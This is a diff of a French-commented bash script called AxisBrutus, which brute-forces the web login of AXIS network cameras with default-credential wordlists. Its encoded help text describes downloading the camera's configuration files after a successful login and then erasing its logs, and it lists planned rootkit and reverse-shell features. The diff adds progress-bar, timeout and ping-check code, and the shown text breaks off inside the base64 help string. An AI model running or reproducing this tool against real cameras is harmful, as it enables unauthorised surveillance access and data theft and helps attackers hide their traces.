@@ -1,51 +1,21 @@
 #!/bin/bash
 # CHORFA Alla-eddine
 # h4ckr213dz@gmail.com
-#
-# CHANGELOG:
-# 2.2 [01.00.2019]:
-#	- Ameliorations:
-#		- Mode verbeux (--verbose, --v) : Possibilité d'affichier plus ou mopins d'infos à l'écran 
-#		- Estimation du temps restants d'après le nombre de combinaisons restantes et la durée des précedentes 
-#	- Correction de bugs : 
-#		- calcul de durée plus précis
-#		- Suppresson des fichiers temporaires locaux
-#
-# 2.1 [31.07.2019]:
-#	- Amelioration : 
-#		- Logging attaques : Un fichier logs est créé afin de logger les actions. Pratique lorsqu'on envoi une grande liste d'adresses ip en parametre.
-#	- Correction de bugs : 
-#		- Prise en compte du décalage d'heure d'été dans les calculs des durées
-#
-# 2.0 [27.07.2019]:
-#	- Ajout information : 
-#		- Affichage de la durée de l'attaque dans le résumé
-#		- Affichage de la progression de l'attaque cen %
-#
-#	- Amelioration : 
-#		- Curl :
-#			--connect-timeout 10 (s)
-#			--max-time 20 (s) 
-#
-#	- Ajout de modeles verifiés : 
-#		- AXIS 2110 Network Camera
-#
-#	- Optimisations : 
-#		- Simplifications du script
-#		- Ajout de com	mentaires au script
-#
+# https://github.com/dino213dz/
+# Créé le 25.07.2019
 ####################################################################################################################
 #                                                     AxisBrutus
 ####################################################################################################################
 ab_auteur='CHORFA Alla-eddine'
 ab_date_creation='25.07.2019'
-ab_date_maj='01.08.2019 16:30'
 ab_date_maj=$(/bin/ls -l --time-style=full-iso axisBrutus.sh|cut -d " " -f 6)" "$(/bin/ls -l --time-style=full-iso axisBrutus.sh|cut -d " " -f 7|rev|cut -d ":" -f 2-|rev)
 ab_titre='AxisBrutus'
-ab_ver='2.2'
+ab_ver='2.3'
 ab_contact='h4ckr213dz@gmail.com'
 ab_web='https://github.com/dino213dz/'
 ab_slogan='La plus fine des brutes!'
+ab_slogan_bravo='La brute a encore frappé!'
+ab_slogan_defaite="Ce minus a esquivé toutes nos frappes! Donne moi plus de mots-de-passes et plus de logins à manger si tu veux qu'on gagne!"
 
 ####################################################################################################################
 #                                                      VARIABLES
@@ -81,7 +51,6 @@ reset='\033[0m'
 
 
 #BANNIERES
-
 #Banniere principale:
 banniere='IOKWhOKWhOKWhCAgICAgIOKWkuKWiOKWiCAgIOKWiOKWiOKWkiDilojilojilpMgIOKWiOKWiOKWiOKWiOKWiOKWiCAg4paE4paE4paE4paEICAgIOKWiOKWiOKWgOKWiOKWiOKWiCAgIOKWiCAgICDilojilogg4paE4paE4paE4paI4paI4paI4paI4paI4paTIOKWiCAgICDilojiloggICDilojilojilojilojilojiloggCuKWkuKWiOKWiOKWiOKWiOKWhCAgICDilpLilpIg4paIIOKWiCDilpLilpHilpPilojilojilpLilpLilojiloggICAg4paSIOKWk+KWiOKWiOKWiOKWiOKWiOKWhCDilpPilojilogg4paSIOKWiOKWiOKWkiDilojiloggIOKWk+KWiOKWiOKWkuKWkyAg4paI4paI4paSIOKWk+KWkiDilojiloggIOKWk+KWiOKWiOKWkuKWkuKWiOKWiCAgICDilpIgCuKWkuKWiOKWiCAg4paA4paI4paEICDilpHilpEgIOKWiCAgIOKWkeKWkuKWiOKWiOKWkuKWkSDilpPilojilojiloQgICDilpLilojilojilpIg4paE4paI4paI4paT4paI4paIIOKWkeKWhOKWiCDilpLilpPilojiloggIOKWkuKWiOKWiOKWkeKWkiDilpPilojilojilpEg4paS4paR4paT4paI4paIICDilpLilojilojilpHilpEg4paT4paI4paI4paEICAgCuKWkeKWiOKWiOKWhOKWhOKWhOKWhOKWiOKWiCAg4paRIOKWiCDilogg4paSIOKWkeKWiOKWiOKWkSAg4paSICAg4paI4paI4paS4paS4paI4paI4paR4paI4paAICDilpLilojilojiloDiloDilojiloQgIOKWk+KWk+KWiCAg4paR4paI4paI4paR4paRIOKWk+KWiOKWiOKWkyDilpEg4paT4paT4paIICDilpHilojilojilpEgIOKWkiAgIOKWiOKWiOKWkgog4paT4paIICAg4paT4paI4paI4paS4paS4paI4paI4paSIOKWkuKWiOKWiOKWkuKWkeKWiOKWiOKWkeKWkuKWiOKWiOKWiOKWiOKWiOKWiOKWkuKWkuKWkeKWk+KWiCAg4paA4paI4paT4paR4paI4paI4paTIOKWkuKWiOKWiOKWkuKWkuKWkuKWiOKWiOKWiOKWiOKWiOKWkyAgIOKWkuKWiOKWiOKWkiDilpEg4paS4paS4paI4paI4paI4paI4paI4paTIOKWkuKWiOKWiOKWiOKWiOKWiOKWiOKWkuKWkgog4paS4paSICAg4paT4paS4paI4paR4paS4paSIOKWkSDilpHilpMg4paR4paR4paTICDilpIg4paS4paT4paSIOKWkiDilpHilpHilpLilpPilojilojilojiloDilpLilpEg4paS4paTIOKWkeKWkuKWk+KWkeKWkeKWkuKWk+KWkiDilpIg4paSICAg4paSIOKWkeKWkSAgIOKWkeKWkuKWk+KWkiDilpIg4paSIOKWkiDilpLilpPilpIg4paSIOKWkQogIOKWkiAgIOKWkuKWkiDilpHilpHilpEgICDilpHilpIg4paRIOKWkiDilpHilpEg4paR4paSICDilpEg4paR4paS4paR4paSICAg4paRICAg4paR4paSIOKWkSDilpLilpHilpHilpHilpLilpEg4paRIOKWkSAgICAg4paRICAgIOKWkeKWkeKWkuKWkSDilpEg4paRIOKWkSDilpHilpIgIOKWkSDilpEKICDilpEgICDilpIgICAg4paRICAgIOKWkSAgIOKWkiDilpHilpEgIOKWkSAg4paRICAg4paRICAgIOKWkSAgIOKWkeKWkSAgIOKWkSAg4paR4paR4paRIOKWkSDilpEgICDilpEgICAgICAg4paR4paR4paRIOKWkSDilpEg4paRICDilpEgIOKWkSAgCiAgICAgIOKWkSAg4paRIOKWkSAgICDilpEgICDilpEgICAgICAgIOKWkSAgIOKWkSAgICAgICAgIOKWkSAgICAgICAg4paRICAgICAgICAgICAgICAgICDilpEgICAgICAgICAgIOKWkSAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg4paRICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAo='
 #Banniere dino213dz
@@ -91,16 +60,29 @@ banniere_export='ICBfXyAgIF8gIF8gIF9fICBfX19fICBfX19fICBfX19fICBfICBfICBfX19fICB
 #Banniere effacementLogs:
 #droid
 banniere_logs='ICAgICAgICAgICAgICAuYW5kQUhIQWJubi4KICAgICAgICAgICAuYUFISEhBQVVVQUFISEhBbi4KICAgICAgICAgIGRIUF5+IiAgICAgICAgIn5eVEhiLgogICAgLiAgIC5BSEYgICAgICAgICAgICAgICAgWUhBLiAgIC4KICAgIHwgIC5BSEhiLiAgICAgICAgICAgICAgLmRISEEuICB8CiAgICB8ICBISEFVQUFIQWJuICAgICAgYWRBSEFBVUFIQSAgfAogICAgSSAgSEZ+Il9fX19fICAgICAgICBfX19fIF1ISEggIEkKICAgSEhJIEhBUEsiIn5eWVVIYiAgZEFISEhISEhISEhIIElISAogICBISEkgSEhIRD4gLmFuZEhIICBISFVVUF5+WUhISEggSUhICiAgIFlVSSBdSEhQICAgICAiflkgIFB+IiAgICAgVEhIWyBJVVAKICAgICIgIGBISyAgICAgICAgICAgICAgICAgICBdSEgnICAiCiAgICAgICAgVEhBbi4gIC5kLmFBQW4uYi4gIC5kSEhQCiAgICAgICAgXUhISEhBQVVQIiB+fiAiWVVBQUhISEhbCiAgICAgICAgYEhIUF5+IiAgLmFubm4uICAifl5ZSEgnCiAgICAgICAgIFlIYiAgICB+IiAiIiAifiAgICBkSEYKICAgICAgICAgICJZQWIuLmFiZEhIYm5kYm5kQVAiCiAgICAgICAgICAgVEhIQUFiLiAgLmFkQUhIRgogICAgICAgICAgICAiVUhISEhISEhISEhVIgogICAgICAgICAgICAgIF1ISFVVSEhISEhIWwogICAgICAgICAgICAuYWRISGIgIkhISEhIYm4uCiAgICAgLi5hbmRBQUhISEhISGIuQUhISEhISEhBQWJubi4uCi5uZEFBSEhISEhIVVVISEhISEhISEhIVVBefiJ+XllVSEhIQUFibi4KICAifl5ZVUhIUCIgICAifl5ZVUhIVVAiICAgICAgICAiXllVUF4iCiAgICAgICAiIiAgICAgICAgICJ+fiIK'
-
 #Banniere diverses:
 #bravo
 banniere_bravo='4paE4paE4paE4paEwrcg4paE4paE4paEICAg4paE4paE4paEwrcgIOKWjCDilpDCtyAgICAgIOKWhOKWhCAK4paQ4paIIOKWgOKWiOKWquKWgOKWhCDilojCt+KWkOKWiCDiloDilogg4paq4paIwrfilojilozilqogICAgIOKWiOKWiOKWjArilpDilojiloDiloDilojiloTilpDiloDiloDiloQg4paE4paI4paA4paA4paIIOKWkOKWiOKWkOKWiOKAoiDiloTilojiloDiloQg4paQ4paIwrcK4paI4paI4paE4paq4paQ4paI4paQ4paI4oCi4paI4paM4paQ4paIIOKWquKWkOKWjCDilojilojilogg4paQ4paI4paMLuKWkOKWjC7iloAgCsK34paA4paA4paA4paAIC7iloAgIOKWgCDiloAgIOKWgCAuIOKWgCAgIOKWgOKWiOKWhOKWgOKWqiDiloAgCg=='
+banniere_bravo='IF9fX19fXyAgICAgX19fX19fICAgICBfX19fX18gICAgIF9fICAgX18gICBfX19fX18gICAgCi9cICA9PSBcICAgL1wgID09IFwgICAvXCAgX18gXCAgIC9cIFwgLyAvICAvXCAgX18gXCAgIApcIFwgIF9fPCAgIFwgXCAgX188ICAgXCBcICBfXyBcICBcIFwgXCcvICAgXCBcIFwvXCBcICAKIFwgXF9fX19fXCAgXCBcX1wgXF9cICBcIFxfXCBcX1wgIFwgXF9ffCAgICBcIFxfX19fX1wgCiAgXC9fX19fXy8gICBcL18vIC9fLyAgIFwvXy9cL18vICAgXC9fLyAgICAgIFwvX19fX18vIAo='
+banniere_tryagain='IF9fX19fXyAgIF9fX19fXyAgICAgX18gIF9fICAgICAgICBfX19fX18gICAgIF9fX19fXyAgICAgX19fX19fICAgICBfXyAgICAgX18gICBfXyAgICAKL1xfXyAgX1wgL1wgID09IFwgICAvXCBcX1wgXCAgICAgIC9cICBfXyBcICAgL1wgIF9fX1wgICAvXCAgX18gXCAgIC9cIFwgICAvXCAiLS5cIFwgICAKXC9fL1wgXC8gXCBcICBfXzwgICBcIFxfX19fIFwgICAgIFwgXCAgX18gXCAgXCBcIFxfXyBcICBcIFwgIF9fIFwgIFwgXCBcICBcIFwgXC0uICBcICAKICAgXCBcX1wgIFwgXF9cIFxfXCAgXC9cX19fX19cICAgICBcIFxfXCBcX1wgIFwgXF9fX19fXCAgXCBcX1wgXF9cICBcIFxfXCAgXCBcX1xcIlxfXCAKICAgIFwvXy8gICBcL18vIC9fLyAgIFwvX19fX18vICAgICAgXC9fL1wvXy8gICBcL19fX19fLyAgIFwvXy9cL18vICAgXC9fLyAgIFwvXy8gXC9fLyAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAK'
 #aide
 banniere_aide=$banniere_export
 
+taille_barre_progression=40
+barre_car_fait=":"
+barre_car_restant=":"
+barre_col_fait="\033[0m\033[1;46;33m"
+barre_col_restant="\033[0m\033[0;44;30m"
+barre_col_texte="\033[0m\033[1;33m"
+
 #Inti. var. travail
-curl_timeout=5
-curl_maxtime=10
+curl_timeout_default=5
+curl_timeout=$curl_timeout_default
+curl_maxtime_default=10
+curl_maxtime=$curl_maxtime_default
+ping_timeout_default=10
+ping_timeout=$ping_timeout_default
+min_timeout=3
 succes='Administration'
 echec='Unauthorized'
 msg_succes="Authentification réussie! ([P4wn3d])"
@@ -126,6 +108,20 @@ liste_modeles_verifies=("205" "206" "207" "207W" "207MW" "209FD" "209MFD" "210" 
 ####################################################################################################################
 #                                                       FONCTIONS
 ####################################################################################################################
+
+
+
+#FUNCTION:
+# detecte si erreur 401 : page non autorisée
+function checkConnectiviteCible {
+	#ping_timeout=10
+	packets_perdus=$(ping -W $ping_timeout -c 1 $ip|grep '%'|cut -d ' ' -f 6|cut -d '%' -f 1)
+	if [ $packets_perdus -ne 0 ];then
+		echo "ECHEC"
+	else
+		echo "SUCCES"
+	fi
+	}
 
 #FUNCTION:
 # detecte le modele de la camera axis et la version du firmware si disponible: <AXIS modele Network Camera X.XX>
@@ -261,7 +257,7 @@ function infosGeolocalisation {
 
 	#retirer les infos inutiles
 	infosDbIpDotCom=${infosDbIpDotCom/'"ipAddress'*[0-9]'",'/''}
-	infosDbIpDotCom=${infosDbIpDotCom/'"continentCode'*'countryName:'/'Pays:'}
+	infosDbIpDotCom=${infosDbIpDotCom/'continentCode'*'countryName:'/'Pays:'}
 	
 
 	#Mise en forme pour le script
@@ -377,27 +373,100 @@ function ajouterEspacesSlogans {
 #FUNCTION:
 # verifie l'existence des fichiers
 function afficherAide {
-	aide_texte="IyBBWElTIEJSVVRVUyAKCiMgQSBwcm9wb3M6CiAtIEF1dGV1cjogQ0hPUkZBIEFsbGEtZWRkaW5lCiAtIENyw6llIGxlOiAyNS4wNy4yMDE5CiAtIEVkaXTDqSBsZTogMjkuMDcuMjAxOQogLSBWZXJzaW9uOiAyLjAKIC0gQ29udGFjdDogaDRja3IyMTNkekBnbWFpbC5jb20KIC0gV2ViOiBodHRwOi8vZGlubzIxM2R6LmZyZWUuZnIKCiMgRGVzY3JpcHRpb246CiAtIExhIHBsdXMgZmluZSBkZXMgYnJ1dGVzIQogLSBCcnV0ZSBmb3JjZSBsZXMgaW50ZXJmYWNlcyB3ZWIgZGVzIGNhbWVyYXMgSVAgQVhJUwogLSBOZWNlc3NpdGUgdW4gZmljaGllciBtZHAgZXQgdW4gZmljaGllciB1c2VybmFtZXMgOgoJMS0gLi93b3JkbGlzdHMvYXhpc19tZHBfbGlnaHQudHh0CgkyLSAuL3dvcmRsaXN0cy9heGlzX21kcF9saWdodC50eHQKIC0gQ2VzIGZpY2hpZXJzIGNvbnRpZW5uZXQgbGVzIGxvZ2lucyBldCBtb3QtZGUtcGFzc2UgcGFyIGRlZmF1dCBkZXMgY2FtZXJhcyBBeGlzLgoKIyBTeW50YXhlOgogLSAkPiAuL2F4aXNCcnV0dXMuc2ggW09QVElPTlNdIC0tY2libGV8LWMgSVB8SVA6UE9SVAoKIyBQYXJhbWV0cmVzIG9ibGlnYXRvaXJlczoKIC0gLS1jaWJsZSwgLWMgOiBJUCwgSVA6UE9SVCwgVVJMCgojIFBhcmFtZXRyZXMgb3B0aW9ubmVsczoKIC0gLS1za2lwLCAtcyA6IE4nZWZmZWN0dWUgcGFzIGxhIGRldGVjdGlvbiBkdSBtb2RlbGUuIEwndXJsIGNpYmxlIHNlcmEgIi9vcGVyYXRvci9iYXNpYy5zaHRtbCIgcXVpIGVzdCBsYSBwbHVzIHByb2JhYmxlLiBMJ2FyZ3VtZW50IC0tdXJsIHBldXQgZXRyZSB1dGlsaXPDqSBwb3VyIGNoYW5nZXIgbCd1cmwgY2libGUuCiAtIC0tbGlzdCwgLWwgOiBsaXN0ZSBsZXMgbW9kZWxlcyBkZSBjYW1lcmEgY29tcGF0aWJsZXMKIC0gLS1oZWxwLCAtaCA6IGFmZmljaGUgbCdhaWRlCiAtIC0tbm8tZ2VvLCAtLW5vZ2VvLCAtZyA6IETDqXNhY3RpdmUgbGEgZ8Opb2xvY2FsaXNhdGlvbiBkZSBsJ0lQCiAtIC0tY2hlY2ssIC0tY2hrIDogVsOpcmlmaWUgdW5pcXVlbWVudCBsYSBjb21wYXRpYmlsaXTDqSBkJ3VuIG1vZGVsZSBzYW5zIHByb2PDqWRlciDDoCBsJ2F0dGFxdWUKIC0gLS1sb2csIC0tbG9ncyA6IETDqWZpbml0IGwnZW1wbGFjZW1lbnQgZHUgZmljaGllciBsb2dzIGRlcyBvcGVyYXRpb25zIGQnYXR0YXF1ZS4gTGEgdmFsZXVyICBwYXIgZMOpZmF1dCBlc3QgOiAuL2F4aXNCcnV0dXMubG9nCiAtIC0tcGFzc3dvcmRzLCAtcCA6IGZpY2hpZXIgd29yZGxpc3QgY29udGVuYW50IGxhIGxpc3RlIGRlcyBtb3RzLWRlLXBhc3NlCiAtIC0tdXNlcm5hbWVzLCAtdTogZmljaGllciB3b3JkbGlzdCBjb250ZW5hbnQgbGEgbGlzdGUgZGVzIG5vbXMgZCd1dGlsaXNhdGV1cnMKIC0gLS1leHBvcnQsIC0tb3V0cHV0LCAtbyA6IGZpY2hpZXIgZGFucyBsZXF1ZWwgbGUgbW90LWRlLXBhc3NlIHNlcmEgZW5yZWdpc3Ryw6kgcydpbCBlc3QgdHJvdXbDqS4gQXVjdW4gZmljaGllciBjcsOpw6kgc2kgbGUgbW90LWRlLXBhc3NlIG4nZXN0IHBhcyB0cm91dsOpCiAtIC0tdXJsLCAtciA6IEwndXJsIGTDqXBlbmQgZHUgbW9kZWxlLiBWb3VzIHBvdXZleiBsZSBtb2RpZmllciBzaSB2b3VzIHNvdWhhaXRleiB0ZXN0ZXIgdW5lIHBhZ2Ugd2ViIGJpZW4gcHLDqWNpc2UgKGNhcyBkJ3VuIG1vZGVsZSBpbmNvbm51IHBhciBleGVtcGxlKQoKIyBFeGVtcGxlczoKIC0gQXR0YXF1ZSBzdGFuZGFyZCBwYXIgaXAgb3UgcGFyIHVybC4gbGVzIHdvcmRsaXN0IHV0aWxpc8OpcyBpY2kgc29udCBjZXV4IHBhciBkZWZhdXQuIChWb2lyICJEZXNjcmlwdGlvbiIpCgkgLSAkPiAuL2F4aXNCcnV0dXMuc2ggLS1jaWJsZSAxOTIuMjMuMzYuMjU0OjgzIAoJIC0gJD4gLi9heGlzQnJ1dHVzLnNoIC0tY2libGUgaHR0cDovLzE5Mi4yMy4zNi4yNTQ6ODMKCSAtICQ+IC4vYXhpc0JydXR1cy5zaCAtLWNpYmxlIGh0dHBzOi8vbWFDYW1lcmFJcDIxM2R6LmF4aXMuY29tLwoKIC0gQWZmaWNoZXIgbGEgbGlzdGUgZGVzIG1vZMOobGVzIGNvbXBhdGlibGVzCgkgLSAkPiAuL2F4aXNCcnV0dXMuc2ggLS1jaWJsZSAxOTIuMjMuMzYuMjU0OjgzIC0tbGlzdAoKIC0gUGFzIGRlIGdlb2xvY2FsaXNhdGlvbgoJIC0gJD4gLi9heGlzQnJ1dHVzLnNoIC0tY2libGUgMTkyLjIzLjM2LjI1NDo4MyAtLW5vLWdlbwoKIC0gUGFzIGRlIGRldGVjdGlvbiBkdSBtb2RlbGUuIG9uIGTDqWZpbml0IGxlIFRBUkdFVFVSSSBtYW51ZWxsZW1lbnQuCgkgLSAkPiAuL2F4aXNCcnV0dXMuc2ggLS1jaWJsZSAxOTIuMjMuMzYuMjU0OjgzIC0tc2tpcCAtLXVybCAvYWRtaW4vYWRtaW4uc2h0bWwKCiAtIERlZmluaXIgdW5lIGxpc3RlIGRlIGxvZ2luIG1vdC1kZS1wYXNzZSAKCSAtICQ+IC4vYXhpc0JydXR1cy5zaCAtLWNpYmxlIDE5Mi4yMy4zNi4yNTQ6ODMgLS1wYXNzd29yZHMgLi9heGlzX3Bhc3MudHh0IC0tdXNlcm5hbWVzIC4vYXhpc191c2VybmFtZXMudHh0IAoKIC0gRGVmaW5pciBsZSBmaWNoaWVyIGRlIHNhdXZlZ2FyZGU6CgkgLSAkPiAuL2F4aXNCcnV0dXMuc2ggLS1jaWJsZSAxOTIuMjMuMzYuMjU0OjgzIC0tZXhwb3J0IG1kcF9heGlzX3Rlc3QudHh0XQoKIyBBbGdvcml0aG1lOgogLSBSw6ljdXBlcmVyIGxlIG1vZGVsZSBkZSBsYSBjYW1lcmEKIC0gUmVjdXBlcmVyIGxlIGZpcm13YXJlIAogLSBSZWNoZXJjaGUgZCdVUkwgcHJvdGVnw6llIHBhciBtb3QtZGUtcGFzc2UgCiAtIEJydXRlZm9yY2UKIC0gU2kgbW90IGRlIHBhc3NlIHRyb3V2w6k6CiAtIFRlbGVjaGFyZ2VyIGxlcyBmaWNoaWVycyBkZSBjb25maWd1cmF0aW9uCiAtIFNhdXZlZ2FyZGUgZGVzIGRvbm7DqWVzCiAtIEVmZmFjZXIgbGVzIGxvZ3MKCiMgQ2hhbmdlIGxvZ3M6CiAtIFZlcnNpb24gMi4xIDoKCS0gQW1lbGlvcmF0aW9uczoKCQktIExvZ2dpbmcgYXR0YXF1ZXMgOiBVbiBmaWNoaWVyIGxvZ3MgZXN0IGNyw6nDqSBhZmluIGRlIGxvZ2dlciBsZXMgYWN0aW9ucy4gUHJhdGlxdWUgbG9yc3F1J29uIGVudm9pIHVuZSBncmFuZGUgbGlzdGUgZCdhZHJlc3NlcyBpcCBlbiBwYXJhbWV0cmUuCgkJLSBBZmZpY2hlciBsJ0lQIENpYmxlIMOgIGNoYXF1ZSBjb21iaW5haXNvbjogcGVybWV0IGRlIHNhdm9pciBxdWVsbGUgaXAgZXN0IGNpYmzDqWVzIHNhbnMgZGV2b2lyIHJlbW9udGVyIHRvdXQgZW4gaGF1dCBkZSBsJ8OpY3Jhbi4KCS0gQ29ycmVjdGlvbiBkZSBidWdzIDogCgkJLSBQcmlzZSBlbiBjb21wdGUgZHUgZMOpY2FsYWdlIGQnaGV1cmUgZCfDqXTDqSBkYW5zIGxlcyBjYWxjdWxzIGRlcyBkdXLDqWVzCgogLSBWZXJzaW9uIDIuMCA6CgktIEFtZWxpb3JhdGlvbnM6CgkJLSBBbWVsaW9yYXRpb24gZGUgbGEgcmVjaGVyY2hlIGRlIHBhZ2UgcHJvdGVnw6llcwoJCS0gQ29ycmVjdGlvbnMgZGUgYnVncwoJLSBOb3V2ZWF1dMOpcwoJCS0gR2VvbG9jYWxpc2F0aW9uIGRlIGwnSVAKCQktIFRlbGVjaGFyZ2VtZW50IGRlIGZpY2hpZXJzCgkJLSBFZmZhY2VtZW50IGRlIHRyYWNlcwoKIyBBbcOpbGlvcmF0aW9ucyDDoCB2ZW5pcjoKIC0gQWpvdXQgZCd1biBwYXJhbWV0cmUgcXVpIHbDqXJpZmllIGxhIHZlcnNpb24gZGUgbGEgY29tcGF0aWJpbGl0w6kgZGUgbGEgY2FtZXJhIG1haXMgc2FucyBicnV0ZWZvcmNlciA6IC0tY2hlY2ssIC1rCiAtIENyZWF0aW9uIGQnYWNjw6hzIHBlcm1hbmFudCBjYWNow6kgKHJvb3Qta2l0KSA6IC0tcm9vdC1raXQKIC0gYWN0aXZhdGlvbiBkZSBsJ2FjY8OocyBmdHAgLS1mdHAtb24gcG9ydAogLSBBY3RpdmF0aW9uIGQndW4gcmV2ZXJzZXNoZWxsIHNpIHBvc3NpYmxlIChkZXBlbmQgZGUgbGEgdmVyc2lvbikgLS1yZXZlcnNlLXNoZWxsCgoK"
+	aide_texte="IyBBWElTIEJSVVRVUyAKCiMgQSBwcm9wb3M6CiAtIEF1dGV1cjogQ0hPUkZBIEFsbGEtZWRkaW5lCiAtIENyw6llIGxlOiAyNS4wNy4yMDE5CiAtIEVkaXTDqSBsZTogMDIuMDguMjAxOQogLSBWZXJzaW9uOiAyLjMKIC0gQ29udGFjdDogaDRja3IyMTNkekBnbWFpbC5jb20KIC0gV2ViOiBodHRwOi8vZGlubzIxM2R6LmZyZWUuZnIKCiMgRGVzY3JpcHRpb246CiAtIExhIHBsdXMgZmluZSBkZXMgYnJ1dGVzIQogLSBCcnV0ZSBmb3JjZSBsZXMgaW50ZXJmYWNlcyB3ZWIgZGVzIGNhbWVyYXMgSVAgQVhJUwogLSBOZWNlc3NpdGUgdW4gZmljaGllciBtZHAgZXQgdW4gZmljaGllciB1c2VybmFtZXMgOgoJMS0gLi93b3JkbGlzdHMvYXhpc191c2Vycy50eHQKCTItIC4vd29yZGxpc3RzL2F4aXNfbWRwLnR4dAogLSBDZXMgZmljaGllcnMgY29udGllbm5ldCBsZXMgbG9naW5zIGV0IG1vdC1kZS1wYXNzZSBwYXIgZGVmYXV0IGRlcyBjYW1lcmFzIEF4aXMuCgojIEFsZ29yaXRobWU6CiAtIFLDqWN1cGVyZXIgbGUgbW9kZWxlIGRlIGxhIGNhbWVyYQogLSBSZWN1cGVyZXIgbGUgZmlybXdhcmUgCiAtIFJlY2hlcmNoZSBkJ1VSTCBwcm90ZWfDqWUgcGFyIG1vdC1kZS1wYXNzZSAKIC0gQnJ1dGVmb3JjZQogLSBTaSBtb3QgZGUgcGFzc2UgdHJvdXbDqToKIC0gVGVsZWNoYXJnZXIgbGVzIGZpY2hpZXJzIGRlIGNvbmZpZ3VyYXRpb24KIC0gU2F1dmVnYXJkZSBkZXMgZG9ubsOpZXMKIC0gRWZmYWNlciBsZXMgbG9ncwoKIyBTeW50YXhlOgogLSAkPiAuL2F4aXNCcnV0dXMuc2ggLWMgSVA6UE9SVCBbT1BUSU9OU10gCgojIFBhcmFtZXRyZXMgb2JsaWdhdG9pcmVzOgogLSAtLWNpYmxlLCAtYyA6IElQLCBJUDpQT1JULCBVUkwKCiMgUGFyYW1ldHJlcyBvcHRpb25uZWxzOgogLSAtLXNraXAsIC1zIDogTidlZmZlY3R1ZSBwYXMgbGEgZGV0ZWN0aW9uIGR1IG1vZGVsZS4gTCd1cmwgY2libGUgc2VyYSAiL29wZXJhdG9yL2Jhc2ljLnNodG1sIiBxdWkgZXN0IGxhIHBsdXMgcHJvYmFibGUuIEwnYXJndW1lbnQgLS11cmwgcGV1dCBldHJlIHV0aWxpc8OpIHBvdXIgY2hhbmdlciBsJ3VybCBjaWJsZS4KIC0gLS1saXN0LCAtbCA6IGxpc3RlIGxlcyBtb2RlbGVzIGRlIGNhbWVyYSBjb21wYXRpYmxlcwogLSAtLWhlbHAsIC1oIDogYWZmaWNoZSBsJ2FpZGUKIC0gLS1uby1nZW8sIC0tbm9nZW8sIC1nIDogRMOpc2FjdGl2ZSBsYSBnw6lvbG9jYWxpc2F0aW9uIGRlIGwnSVAKIC0gLS1jaGVjaywgLS1jaGsgOiBWw6lyaWZpZSB1bmlxdWVtZW50IGxhIGNvbXBhdGliaWxpdMOpIGQndW4gbW9kZWxlIHNhbnMgcHJvY8OpZGVyIMOgIGwnYXR0YXF1ZQogLSAtLWxvZywgLS1sb2dzIDogRMOpZmluaXQgbCdlbXBsYWNlbWVudCBkdSBmaWNoaWVyIGxvZ3MgZGVzIG9wZXJhdGlvbnMgZCdhdHRhcXVlLiBMYSB2YWxldXIgIHBhciBkw6lmYXV0IGVzdCA6IC4vYXhpc0JydXR1cy5sb2cKIC0gLS1wYXNzd29yZHMsIC1wIDogZmljaGllciB3b3JkbGlzdCBjb250ZW5hbnQgbGEgbGlzdGUgZGVzIG1vdHMtZGUtcGFzc2UKIC0gLS11c2VybmFtZXMsIC11OiBmaWNoaWVyIHdvcmRsaXN0IGNvbnRlbmFudCBsYSBsaXN0ZSBkZXMgbm9tcyBkJ3V0aWxpc2F0ZXVycwogLSAtLWV4cG9ydCwgLS1vdXRwdXQsIC1vIDogZmljaGllciBkYW5zIGxlcXVlbCBsZSBtb3QtZGUtcGFzc2Ugc2VyYSBlbnJlZ2lzdHLDqSBzJ2lsIGVzdCB0cm91dsOpLiBBdWN1biBmaWNoaWVyIGNyw6nDqSBzaSBsZSBtb3QtZGUtcGFzc2Ugbidlc3QgcGFzIHRyb3V2w6kKIC0gLS11cmwsIC1yIDogTCd1cmwgZMOpcGVuZCBkdSBtb2RlbGUuIFZvdXMgcG91dmV6IGxlIG1vZGlmaWVyIHNpIHZvdXMgc291aGFpdGV6IHRlc3RlciB1bmUgcGFnZSB3ZWIgYmllbiBwcsOpY2lzZSAoY2FzIGQndW4gbW9kZWxlIGluY29ubnUgcGFyIGV4ZW1wbGUpCiAtIC0tdmVyYm9zZSwgLXYgOiBwZXJtZXQgZCdhZmZpY2hlciBwbHVzIG91IG1vaW5zIGQnaW5mb3Mgw6AgbCfDqWNyYW4uIFNpIHZlcmJldXggYWxvcnMgOiBHYXJkZSDDoCBsJ2VjcmFuIGxlcyBjb21iaW5haXNvbnMgdGVzdMOpZXMgJiBhZmZpY2hlIGxlIGNvbnRlbnUgZHUgZmljaGVycyB0w6lsw6ljaGFyZ8OpcwoKIyBFeGVtcGxlczoKIC0gQXR0YXF1ZSBzdGFuZGFyZCBwYXIgaXAgb3UgcGFyIHVybC4gbGVzIHdvcmRsaXN0IHV0aWxpc8OpcyBpY2kgc29udCBjZXV4IHBhciBkZWZhdXQuIChWb2lyICJEZXNjcmlwdGlvbiIpCgkgLSAkPiAuL2F4aXNCcnV0dXMuc2ggLS1jaWJsZSAxOTIuMjMuMzYuMjU0OjgzIAoJIC0gJD4gLi9heGlzQnJ1dHVzLnNoIC0tY2libGUgaHR0cDovLzE5Mi4yMy4zNi4yNTQ6ODMKCSAtICQ+IC4vYXhpc0JydXR1cy5zaCAtLWNpYmxlIGh0dHBzOi8vbWFDYW1lcmFJcDIxM2R6LmF4aXMuY29tLwoKIC0gQWZmaWNoZXIgbGEgbGlzdGUgZGVzIG1vZMOobGVzIGNvbXBhdGlibGVzCgkgLSAkPiAuL2F4aXNCcnV0dXMuc2ggLS1jaWJsZSAxOTIuMjMuMzYuMjU0OjgzIC0tbGlzdAoKIC0gUGFzIGRlIGdlb2xvY2FsaXNhdGlvbgoJIC0gJD4gLi9heGlzQnJ1dHVzLnNoIC0tY2libGUgMTkyLjIzLjM2LjI1NDo4MyAtLW5vLWdlbwoKIC0gUGFzIGRlIGRldGVjdGlvbiBkdSBtb2RlbGUuIG9uIGTDqWZpbml0IGxlIFRBUkdFVFVSSSBtYW51ZWxsZW1lbnQuCgkgLSAkPiAuL2F4aXNCcnV0dXMuc2ggLS1jaWJsZSAxOTIuMjMuMzYuMjU0OjgzIC0tc2tpcCAtLXVybCAvYWRtaW4vYWRtaW4uc2h0bWwKCiAtIERlZmluaXIgdW5lIGxpc3RlIGRlIGxvZ2luIG1vdC1kZS1wYXNzZSAKCSAtICQ+IC4vYXhpc0JydXR1cy5z